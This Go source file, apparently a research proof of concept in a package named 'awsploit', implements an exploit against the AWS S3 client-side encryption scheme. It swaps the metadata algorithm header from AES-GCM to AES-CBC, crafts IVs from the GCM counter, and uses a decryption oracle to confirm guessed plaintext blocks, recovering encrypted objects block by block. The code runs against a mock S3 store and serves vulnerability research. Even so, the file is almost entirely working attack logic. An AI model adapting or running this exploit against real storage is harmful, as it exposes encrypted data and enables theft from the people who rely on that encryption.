package awsploit

import (
	"encoding/base64"
	"fmt"
	"strconv"
)

func CombinedOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {
	data, header, err := input.S3Mock.GetObjectDirect(bucket, key)
	if err != nil {
		return "", fmt.Errorf("Could not retrieve encrypted object: %v", err)
	}
	if alg := header.Get("X-Amz-Meta-X-Amz-Cek-Alg"); alg != "AES/GCM/NoPadding" {
		return "", fmt.Errorf("Algorithm is %q, not GCM!", alg)
	}
	length, err := strconv.Atoi(header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Length"))
	if err != nil {
		return "", err
	}
	plaintext := ""
	if length%16 != 0 {
		return "", fmt.Errorf("Combined attack on the whole string works only for 16 byte aligned ciphertexts, but length is %d", length)
	}
	blocks := length / 16
	gcmIv, err := base64.StdEncoding.DecodeString(header.Get("X-Amz-Meta-X-Amz-Iv"))
	if err != nil {
		return "", err
	}
	if len(gcmIv) != 12 {
		return "", fmt.Errorf("GCM IV is %d bytes, not 12", len(gcmIv))
	}
	fullIv := make([]byte, 16)
	confirmIv := make([]byte, 16)
	for i := 0; i < 12; i++ {
		fullIv[i] = gcmIv[i] ^ 0x10
		confirmIv[i] = gcmIv[i] ^ 0x10
	}
outerLoop:
	for i := 0; i < blocks; i++ {
		counter := i + 2
		for j := 15; j >= 12; j-- {
			v := byte(counter % 256)
			fullIv[j] = 0x10 ^ v
			confirmIv[j] = 0x10 ^ v
			counter /= 256
		}
		confirmIv[15] ^= 0x11
		fullIvEnc := base64.StdEncoding.EncodeToString(fullIv)
		confirmIvEnc := base64.StdEncoding.EncodeToString(confirmIv)
		success := false
		for _, plaintextGuess := range input.PossiblePlaintextSegments {
			newData := []byte(plaintextGuess)
			for j := 0; j < 16; j++ {
				newData[j] ^= data[16*i+j]
			}
			newHeader := header.Clone()
			newHeader.Set("X-Amz-Meta-X-Amz-Cek-Alg", "AES/CBC/PKCS5Padding")
			newHeader.Set("X-Amz-Meta-X-Amz-Iv", fullIvEnc)
			newHeader.Set("X-Amz-Meta-X-Amz-Unencrypted-Content-Length", "16")
			input.S3Mock.PutObjectDirect(bucket, key+"guess", newData, newHeader)
			if input.Oracle(bucket, key+"guess") {
				newHeader.Set("X-Amz-Meta-X-Amz-Iv", confirmIvEnc)
				input.S3Mock.PutObjectDirect(bucket, key+"guess", newData, newHeader)
				if input.Oracle(bucket, key+"guess") {
					plaintext += plaintextGuess
					success = true
					continue outerLoop
				}
			}
		}
		if !success {
			return "", fmt.Errorf("Block %d could not be decrypted", i)
		}
	}
	return plaintext, nil
}
